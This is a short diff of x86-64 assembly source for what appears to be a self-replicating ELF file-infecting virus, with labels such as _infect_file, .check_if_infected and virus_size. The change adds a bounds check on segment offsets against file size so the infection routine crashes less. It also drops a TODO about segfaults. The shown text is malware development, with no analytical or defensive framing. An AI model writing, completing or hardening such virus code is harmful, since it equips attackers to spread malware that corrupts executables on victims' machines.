@@ -13,7 +13,6 @@ section.text:
 
 ; TODO:
 ; - better fingerprint
-; - avoid segv on head -c or smthg
 
 ; -== Optimization ==-
 ;-> Save bytes:
@@ -964,7 +963,7 @@ _infect_file: ; (string rdi, stat rsi)
 			pop rax; munmap
 			syscall
 			pop r11
-			
+
 			pop r13
 			jmp .unmap
 			.next_segment_note:
@@ -973,11 +972,14 @@ _infect_file: ; (string rdi, stat rsi)
 ;
 		.check_if_infected:
 			; TODO: check only at offset + filesz - virus_size
-			push rcx
 			lea rdx, [rel signature]
+			mov rdi, [rbx + phdr.p_offset]; p_offset
+			mov rax, [r12 + ST_SIZE]
+			cmp rdi, rax
+			jg .unmap
+			push rcx
 			lea rcx, [rel fingerprint]
 			sub rcx, rdx
-			mov rdi, [rbx + phdr.p_offset]; p_offset
 			add rdi, r13
 			mov rsi, [rbx + phdr.p_filesz]; p_filesz
 ;			cmp rsi, rcx
